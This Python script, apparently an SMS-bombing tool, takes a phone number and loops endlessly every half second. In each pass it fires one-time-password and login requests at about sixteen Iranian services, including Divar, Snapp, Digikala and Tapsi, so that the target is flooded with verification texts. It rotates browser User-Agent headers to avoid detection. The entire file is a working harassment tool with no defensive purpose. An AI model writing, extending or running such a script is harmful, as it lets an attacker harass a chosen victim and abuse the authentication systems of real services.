import random
import time
import os
import requests
from colorama import Fore

os.system("cls")


baner = (Fore.MAGENTA+"""

 █████╗ ███╗   ███╗██╗██████╗ 
██╔══██╗████╗ ████║██║██╔══██╗
███████║██╔████╔██║██║██████╔╝
██╔══██║██║╚██╔╝██║██║██╔══██╗
██║  ██║██║ ╚═╝ ██║██║██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
                              
██████╗ ██╗███╗   ██╗██╗  ██╗ 
██╔══██╗██║████╗  ██║██║ ██╔╝ 
██████╔╝██║██╔██╗ ██║█████╔╝  
██╔═══╝ ██║██║╚██╗██║██╔═██╗  
██║     ██║██║ ╚████║██║  ██╗ 
╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ 
                              
                       
""")

print(baner)

number = input(Fore.BLUE+"   Enter your Phone Number" + Fore.RED + " \n     <-(with out 0)->" + Fore.WHITE + "\n        ")



#divar
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

#snapp
url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

#sheypoor
url_sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor = {"username":"0" + number}

#snappfood
url_snappfood = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=6da9e556-ae21-4fa7-8de4-3097574ba42f&locale=fa"
json_snappfood = {"cellphone":"0" + number}

#digikala
url_digikala = "https://api.digikala.com/v1/user/authenticate/"
json_digikala =  {"username":"0" + number}

#snapproom
url_snapproom = "https://napi.snapproom.com/users/self/verification-flow"
json_snapproom = {"username":"0" + number}

#torob
url_torob = "https://api.torob.com/v4/user/phone/send-pin/?{json_torob}"
json_torob = {"phone_number":"0" + number} 

#alibaba
url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba = {"phoneNumber": "+98" + number}

#esam
url_esam = "https://api.esam.ir/api/account/RegisterOrLogin"
json_esam = {"mobile": "0" + number}

#timcheh
url_timcheh = "https://api.timcheh.com/auth/otp/send"
json_timcheh = {"mobile": "0" + number}

#diyanshop
url_diyan = "https://dayanshop.com/Auth/CheckPhoneNumber"
json_diyan = {"phoneNumber": "0" + number}

#mobit
url_mobit = "https://api.mobit.ir/api/web/v6/register/login"
json_mobit = {"number": "0" + number}

#kalazem
url_kalazem = "https://kalazem.com/login?back=my-account"
json_kalazem = {"username":"0" + number}

#tapsi
url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
json_tapsi = {"phoneNumber": "0" + number}

#snapp market
url_snappm = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
json_snappm = {"cellphone": "0" + number}

#anten
url_anten = "https://api2.anten.ir/users"
json_anten = {"phone": "0" + number}



heade =[
    { 
        'User-Agent':'Mozilla/5.0 (windows NT 6.1; rv:76.0) Geck/20100101 Firefox/76.0',
        'Accept': '*/*'

    },
    {
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent":"Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent':'Mozilla/5.0 (windows NT 3.1; rv:76.0) Geck/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent":"Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]


while True:
    
    random_head = random.choice(heade)

    #divar
    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)

    #snapp
    req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req1)

    #sheypoor
    req2 = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print(req2)

    #snappfood
    req3 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head)
    print(req3)

    #digikala
    req4 = requests.post(url=url_digikala,json=json_digikala,headers=random_head)
    print(req4)

    #snapproom
    req5 = requests.post(url=url_snapproom,json=json_snapproom,headers=random_head)
    print(req5)

    #torob
    req6 = requests.get(url=url_torob,json=json_torob,headers=random_head)
    print(req6)

    #alibaba
    req7 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print(req7)

    #esam
    req8 = requests.post(url=url_esam,json=json_esam,headers=random_head)
    print(req8)

    #timcheh
    req9 = requests.post(url=url_timcheh,json=json_timcheh,headers=random_head)
    print(req9)

    #diyanshop
    req10 = requests.post(url=url_diyan,json=json_diyan,headers=random_head)
    print(req10)

    #mobit
    req11 = requests.post(url=url_mobit,json=json_mobit,headers=random_head)
    print(req11)

    #kalazem
    req12 = requests.post(url=url_kalazem,json=json_kalazem,headers=random_head)
    print(req12)

    #tapsi
    req13 = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
    print(req13)

    #snapp market
    req14 = requests.post(url=url_snappm,json=json_snappm,headers=random_head)
    print(req14)

    #anten
    req15 = requests.post(url=url_anten,json=json_anten,headers=random_head)
    print(req15)

    time.sleep(0.5)




